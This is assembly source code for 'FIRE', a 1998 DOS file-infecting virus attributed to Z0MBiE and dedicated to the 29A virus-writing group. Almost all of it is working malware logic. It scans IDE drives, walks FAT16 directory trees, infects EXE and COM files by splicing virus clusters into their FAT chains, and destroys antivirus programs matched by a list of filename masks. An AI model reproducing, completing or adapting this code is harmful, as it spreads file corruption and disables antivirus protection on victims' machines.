   ;-----------------------------------------------------------------------------
   ; [FIRE]   FAT16 Independent Replicative Emulator   Copyright (c) 1998 Z0MBiE
   ; Release 1.00[BETA]   *** NOT FOR [RE]PUBLISHING IN VX-ZINES, EXCEPT 29A ***
   ; Thanx to S.S.R. & LordASD              HomePage: http://www.chat.ru/~z0mbie
   ;-----------------------------------------------------------------------------
   ;
   ;                 THIS VIRUS TECHNOLOGY DEDICATED TO 29A GROUP
   ;
   ;                               *** Program ***
   ;
   ;   1. Using IDE IO-port access method find all physical IDE drives
   ;   2. For each physical drive find all logical disks with FAT16 system
   ;   3. For each logical disk scan directory tree with selected
   ;      max directory level
   ;   5. Delete all AV-files (by filemasks), including file name/cluster chain
   ;   6. Infect each EX?/CO? file (with selected min. size)
   ;
   ;                           *** Infection Method ***
   ;
   ;   1. Allocate some free cluster(s) in the FAT
   ;   2. FAT.LastOurCluster <- DirEntry.StartCluster
   ;   3. DirEntry.StartCluster <- 1stOurCluster
   ;

   DEBUG                   equ     YES             ; debug mode

                           IFDEF   DEBUG
   START_DRIVE             equ     'E'             ; start scanning
                           ELSE                    ; from logical drive
   START_DRIVE             equ     'C'
                           ENDIF

   virsize                 equ     16384           ; total virus size

   o                       equ     (word ptr 0)    ; to access DWORDs
   s                       equ     (word ptr 2)

   exe_struc               struc                   ; dos exe header
   exe_mz                  dw      ?               ; MZ/ZM
   exe_last512             dw      ?
   exe_num512              dw      ?
   exe_relnum              dw      ?
   exe_headersize          dw      ?               ; in PAR
   exe_minmem              dw      ?
   exe_maxmem              dw      ?
   exe_ss                  dw      ?
   exe_sp                  dw      ?
   exe_checksum            dw      ?               ; 0
   exe_ip                  dw      ?
   exe_cs                  dw      ?
   exe_relofs              dw      ?
   exe_ovrnum              dw      ?               ; 0
                           db      32 dup (?)
   exe_neptr               dd      ?
                           ends

                           model   tiny            ; header
                           p386
                           jumps
                           locals  __

   code                    segment byte public use16;code segment
                           assume  cs:code, ds:code, ss:code, es:code

                           org     100h
   start:
   virus:                  db      'MZ'            ; lets generate .exe program
                           dw      0
                           dw      virsize / 512
                           dw      0
                           dw      0
                           dw      virmemory
                           dw      virmemory
                           dw      0fff0h
                           dw      exe_endofstack
                           dw      0
                           dw      exe_entrypoint
                           dw      0fff0h
                           dw      40h
                           dw      0
                           db      32 dup (0)
                           dd      0

   C_INFECTED_ID           equ     1234h           ; infected file ID
   infected_id             dw      C_INFECTED_ID

   FTYPE                   db      ?

   exe_entrypoint:         mov     ax, 1600h       ; windows :-?
                           int     2fh

                           or      al, al          ; dos
                           jz      DOS_START

                           cmp     al, 4           ; win95...
                           je      WIN4_START

                           ; win3, etc.

   EXIT:                   mov     ax, 4c00h       ; exit to DOS
                           int     21h

   WIN4_START:             jmp     EXIT            ; not implemented yet

   win_msg                 db      'This program requires Microsoft Windows.',13,10,'$'

   DOS_START:              mov     ah, 9           ; fucking message
                           lea     dx, win_msg
                           int     21h

                           IFDEF   DEBUG           ; initialize PUTCHAR
                           mov     cs:putchar_ptr, offset dos_putchar
                           ENDIF

                           call    dos_alloc       ; allocate memory (dos)
                           jc      EXIT

                           call    main            ; main subprogram

                           call    dos_dealloc     ; deallocate memory

                           jmp     EXIT            ; exit

   main:                   mov     level0_drive, 0 ; scan HD: 0,1,2,3
   __1:                    call    process_0
                           inc     level0_drive    ; bit0 = master/slave
                           cmp     level0_drive, 3 ; bit1 = primary/secondary
                           jbe     __1
                           ret

   process_0:              call    level0_init     ; initialize hardware
                           jc      __exit

                           IFDEF   DEBUG           ; fucking message
                           movzx   ax, level0_drive
                           add     al, '0'
                           push    ax
                           call    printf
                           db      'Processing physical drive %c\n$'
                           ENDIF

                           call    level2_init     ; recursive scan for logical
                           jc      __exit          ; disks

                           mov     cx, START_DRIVE-'C'    ; start drive

   __1:                    cmp     cx, level2_drivecount  ; cycle
                           jae     __exit
                           push    cx

                           IFDEF   DEBUG           ; fucking message
                           mov     ax, cx
                           add     al, 'C'
                           push    ax
                           call    printf
                           db      'Processing logical drive %c:\n$'
                           ENDIF

                           mov     level2_drive, cx  ; initialize "basesector"
                           call    level2_initdrive

                           call    level3_init       ; initialize level3-access
                           jc      __2

                           IFDEF   DEBUG           ; fucking message
                           call    printf
                           db      'Compatibility test done\n$'
                           ENDIF

                           call    rulez_forever   ; best subprogram in the world

   __2:                    IFDEF   DEBUG           ; fucking message
                           call    printf
                           db      'Drive processed\n$'
                           ENDIF

                           pop     cx              ; end of cycle
                           inc     cx
                           jmp     __1

   __exit:                 ret

   ; - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

                           ; recursive scan directory tree

   rulez_forever:          IFDEF   DEBUG           ; fucking message
                           call    printf
                           db      'Executing RULEZ_FOREVER\n$'
                           ENDIF

                           mov     _rec, 0         ; recurse level
                           mov     bp, ROOT        ; start from ROOT directory
                           call    process_dir

                           IFDEF   DEBUG           ; fucking message
                           call    printf
                           db      'RULEZ_FOREVER Executed\n$'
                           ENDIF

                           ret

                           ; this is recursive subprogram

   process_dir:            IFDEF   DEBUG           ; fucking message
                           push    _rec
                           push    bp
                           call    printf
                           db      'Executing PROCESS_DIR [cluster %iw04h0], RECURSIVE %iw00d\n$'
                           ENDIF

                           call    __read          ; read directory cluster (bp)

                           lgs     si, dir_ptr     ; gs:si = directory cluster

                           mov     ecx, level3_sectpercluster  ; cx=#direntries
                           shl     cx, 4

   __cycle:
                           ; check for valid filename

                           cmp     gs:[si].direntry_name, char_DELETED
                           je      __cont
                           cmp     gs:[si].direntry_name, char_NOFILE
                           je      __exit

                           ; check for AV filename, CF=1 - file is fucked
                           call    TRY_TO_FUCK_FILE
                           jc      __cont

                           ; zero-length file or directory link to ROOT
                           cmp     gs:[si].direntry_cluster, 0  ; zero-file
                           je      __cont

                           ; file attribute
                           mov     al, gs:[si].direntry_attr

                           test    al, fa_volumeid   ;  volumeid, long-filename
                           jnz     __cont

                           test    al, fa_directory  ; directory?
                           jnz     __directory

                           ; yes! file!

   MINSIZE                 equ     1024
                           cmp     gs:[si].direntry_size, MINSIZE ; check size
                           jb      __cont

                           ; normal attributes?
                           test    al, not (fa_archive + fa_hidden + fa_system + fa_readonly)
                           jz      __file

   __cont:                 add     si, 32    ; cycle
                           loop    __cycle

                           ; flush directory cluster if modified
                           call    TRY_TO_FLUSH_DIR_CACHE

                           ; root? - exit!
                           cmp     bp, ROOT
                           je      __exit

                           ; READ NEXT DIRECTORY CLUSTER

                           mov     bx, bp  ; get nextcluster value
                           call    level3_cluster_get

                           cmp     ax, EOF ; end of directory?
                           je      __exit

                           mov     bp, ax  ; process next dircluster
                           jmp     process_dir

   __exit:                 ; flush directory cluster if modified
                           call    TRY_TO_FLUSH_DIR_CACHE

                           ret

   __file:                 IFDEF   DEBUG           ; fucking message
                           push    word ptr gs:[si].direntry_cluster
                           push    gs
                           push    si
                           call    printf
                           db      '%s11  %iw04h0\n$'
                           ENDIF

                           ; get extension

                           mov     ax, word ptr gs:[si].direntry_ext

                           cmp     ax, 'XE'
                           je      __ext_ok
                           cmp     ax, 'OC'
                           je      __ext_ok

                           jmp     __cont

   __ext_ok:               IFDEF   DEBUG           ; fucking message
                           call    printf
                           db      'Extension checked - OK\n$'
                           ENDIF

                           ; read 1st file cluster
                           pusha
                           mov     ax, gs:[si].direntry_cluster
                           mov     level3_cluster, ax
                           mov     level3_count, 1
                           push    buf_ptr
                           pop     level3_ptr
                           call    level3_read
                           popa

                           ; fs:bx = @file cluster
                           lfs     bx, buf_ptr

                           ; "INFECTED" id ?
                           cmp     word ptr fs:[bx + infected_id-virus], C_INFECTED_ID
                           je      __cont

                           ; determine com or exe file
                           cmp     fs:[bx].exe_mz, 'MZ'
                           je      __mz
                           cmp     fs:[bx].exe_mz, 'ZM'
                           je      __mz
                           mov     FTYPE, 'c'
                           jmp     __not_mz
   __mz:                   mov     FTYPE, 'e'
   __not_mz:

                           IFDEF   DEBUG  ; hehe... be curefull!
                           pusha
                           lea     si, fs:[bx].byte ptr 20h
                           lea     di, z0mbie_id
                           mov     cx, z0mbie_id_len
                           segfs
                           rep     cmpsb
                           popa
                           jne     __cont
                           ENDIF

   __super_infect:         IFDEF   DEBUG           ; fucking message
                           call    printf
                           db      '*** Executing SUPER_INFECT ***\n$'
                           ENDIF

                           ; now infect fucking file...

                           pushad

                           ; calculate bytes per cluster
                           mov     eax, level3_sectpercluster
                           shl     eax, 9
                           mov     __cluster_size, eax

                           ; calculate # of clusters needed

                           xor     eax, eax
   __rep:                  inc     eax

                           mov     ecx, eax
                           imul    ecx, __cluster_size

                           cmp     ecx, virsize
                           jb      __rep

                           mov     __clust_need, eax

                           ; increase file size

                           add     gs:[si].direntry_size, ecx

                        ;  lfs     bx, buf_ptr
                        ;  add     ecx, fs:[bx].exe_neptr
                        ;  mov     neptr, ecx

                           ; store dircluster
                           mov     bx, gs:[si].direntry_cluster
                           mov     __dircluster, bx

                           ; pointer to virus
                           mov     level3_ptr.o, offset virus
                           mov     level3_ptr.s, cs

                           ; NOW CREATE CLUSTER CHAIN

                           xor     bx, bx    ; no cluster

   __next_cluster:         call    __find_free_cluster ; find free cluster
                           jc      __infected

                           mov     ax, __freecluster   ; write virus part
                           mov     level3_cluster, ax  ; to this cluster
                           mov     level3_count, 1
                           call    level3_write

                           mov     eax, __cluster_size ; increase virus pointer
                           shr     eax, 4              ; by cluster size
                           add     level3_ptr.s, ax

                           mov     ax, __freecluster

                           or      bx, bx
                           jnz     __not1st

                           mov     __1stcluster, ax    ; 1st cluster
                           mov     bx, ax              ; temporary init with EOF
                           mov     ax, EOF

   __not1st:               call    level3_cluster_set  ; used to create links

                           mov     bx, __freecluster

                           dec     __clust_need        ; end of cycle
                           jnz     __next_cluster

                           mov     ax, __dircluster    ; set link to dircluster
                           call    level3_cluster_set

                           mov     ax, __1stcluster    ; set new dircluster
                           mov     gs:[si].direntry_cluster, ax

                           mov     CACHE_MODIFIED, 1   ; of coz cache now modified

   __infected:             popad           ; thats all!!!
                           jmp     __cont

   __1stcluster            dw      ?       ; some vars used in infection
   __cluster_size          dd      ?
   __clust_need            dd      ?
   __dircluster            dw      ?
   __freecluster           dw      ?

   __find_free_cluster:    pushad          ; subprogram to find free cluster
                           mov     bx, 2   ; scan all clusters
   __q:                    call    level3_cluster_get
                           or      ax, ax
                           jz      __found
                           inc     bx
                           cmp     bx, word ptr level3_totalclusters
                           jae     __no_free_cluster
                           jmp     __q
   __found:                mov     __freecluster, bx
                           popad
                           clc    ; sucess
                           ret
   __no_free_cluster:      popad
                           stc    ; mustdie
                           ret

                           ; if found directory

   __directory:            IFDEF   DEBUG           ; fucking message
                           push    word ptr gs:[si].direntry_cluster
                           push    gs
                           push    si
                           call    printf
                           db      '%s11  %iw04h0%  <DIRECTORY>\n$'
                           ENDIF

                           ; '.' and '..' is sux
                           cmp     gs:[si].direntry_name, '.'
                           je      __cont

                           ; check for max recurse level
   MAX_RECURSIVE           equ     5
                           cmp     _rec, MAX_RECURSIVE
                           jae     __cont

                           ; flush cache if modified
                           call    TRY_TO_FLUSH_DIR_CACHE

                           ; scan directory
                           pushad

                           inc     _rec

                           mov     bp, gs:[si].direntry_cluster
                           call    process_dir

                           dec     _rec

                           popad

                           ; read directory cluster (becoz its modified)
                           call    __read

                           IFDEF   DEBUG           ; fucking message
                           call    printf
                           db      'Back from recursive subprogram\n$'
                           ENDIF

                           jmp     __cont

                           ; read directory cluster

   __read:                 mov     level3_cluster, bp
                           mov     level3_count, 1
                           push    dir_ptr
                           pop     level3_ptr
                           call    level3_read

                           mov     CACHE_MODIFIED, 0
                           ret

                           ; write directory cluster if modified

   TRY_TO_FLUSH_DIR_CACHE: cmp     CACHE_MODIFIED, 0
                           je      __exit
                           mov     CACHE_MODIFIED, 0

                           mov     level3_cluster, bp
                           mov     level3_count, 1
                           push    dir_ptr
                           pop     level3_ptr
                           call    level3_write

   __exit:                 ret

   ; ---------------------------------------------------------------------------

                           ; input:  GS:[SI]
                           ; output: CF=1 - file fucked

                           ; scan for AV-files

   TRY_TO_FUCK_FILE:       pushad

                           ; hehe.. DRWEB 4.00!
                           cmp     gs:[si].direntry_time, 2000h  ; 4:00 am
                           je      __fuck_it

                           lea     di, fucked

   __next_f:               pusha
                           xor     bx, bx
   __next:                 mov     al, [bx+di]
                           cmp     al, '?'
                           je      __equ
                           mov     ah, gs:[si+bx]
                           cmp     ah, 'a'
                           jb      __cmp
                           cmp     ah, 'z'
                           ja      __cmp
                           add     ah, 'A'-'a'
   __cmp:                  cmp     al, ah
                           jne     __rt
   __equ:                  inc     bx
                           cmp     bx, 11
                           jb      __next
                           ; e
   __rt:                   popa
                           je     __fuck_it

                           add     di, 11
                           cmp     di, offset fucked_end
                           jb      __next_f

                           popad

                           clc
                           ret

                           ; FUCK AV-file

   __fuck_it:              mov     CACHE_MODIFIED, 1

                           mov     bx, gs:[si].direntry_cluster

                           ; kill namme
                           mov     di, si
                           mov     cx, 32
   __1:                    mov     byte ptr gs:[di], 0
                           inc     di
                           loop    __1
                           mov     gs:[si].direntry_name, char_DELETED

                           or      bx, bx  ; zero-file
                           je      __eof

                           ; kill cluster links

   __killnext:             call    level3_cluster_get

                           pusha
                           xor     ax, ax
                           call    level3_cluster_set
                           popa

                           cmp     ax, EOF
                           je      __eof

                           mov     bx, ax
                           jmp     __killnext

   __eof:

                           popad

                           stc
                           ret

   ; ---------------------------------------------------------------------------

                           ; AV-files - KILL`EM ALL !!!

   fucked:                 db      'ANTI???????'
                           db      'DRWEB??????'
                           db      'WEB?????EXE'
                           db      'AIDS???????'
                           db      'AVP????????'
                           db      'SCAN???????'
                           db      'ADIN???????'
                           db      'FPROT??????'
                           db      'TBAV???????'
                           db      'VIR????????'
                           db      '????????327'
                           db      '????????AVC'
                           db      '????????WEB'
                           db      '????????MS '
                           db      '????????CPS'
   fucked_end:

   ; ---------------------------------------------------------------------------

                           IFDEF   DEBUG           ; dont kill your hd, baby...
   z0mbie_id               db      'Z0MBiE#ID1234'
   z0mbie_id_len           equ     $-z0mbie_id
                           ENDIF

   ; ---------------------------------------------------------------------------

                           ; never change it, sucker...

   db 13,10
   db '-----------------------------------------------------------------------------',13,10
   db ' [FIRE]   FAT16 Independent Replicative Emulator   Copyright (c) 1998 Z0MBiE ',13,10
   db ' Release 1.00[BETA]   *** NOT FOR [RE]PUBLISHING IN VX-ZINES, EXCEPT 29A *** ',13,10
   db ' Thanx to S.S.R. & LordASD              HomePage: http://www.chat.ru/~z0mbie ',13,10
   db '-----------------------------------------------------------------------------',13,10
   db 13,10

   ; ---------------------------------------------------------------------------

   include                 malloc.inc      ; <- dos memory allocation
   include                 fatsys.inc      ; <- file system emulator

                           IFDEF   DEBUG   ; <- screen output routines
   include                 stdio.inc
                           ENDIF

                           ; end of virus (EOV) mark
                           org     start+virsize-3
                           db      'EOV'
   codeend:

   ; ---------------------------------------------------------------------------

   datastart:
                           ; stack
                           even
                           db      1024 dup (?)
   exe_endofstack:

                           ; variables
   include                 FATSYS.VAR

   _rec                    dw      ?       ; recurse level
   CACHE_MODIFIED          db      ?       ; flag

                           ; thats all
   dataend:
   virmemory               equ     (dataend-datastart+15)/16

   ; ---------------------------------------------------------------------------

   code                    ends
                           end     start
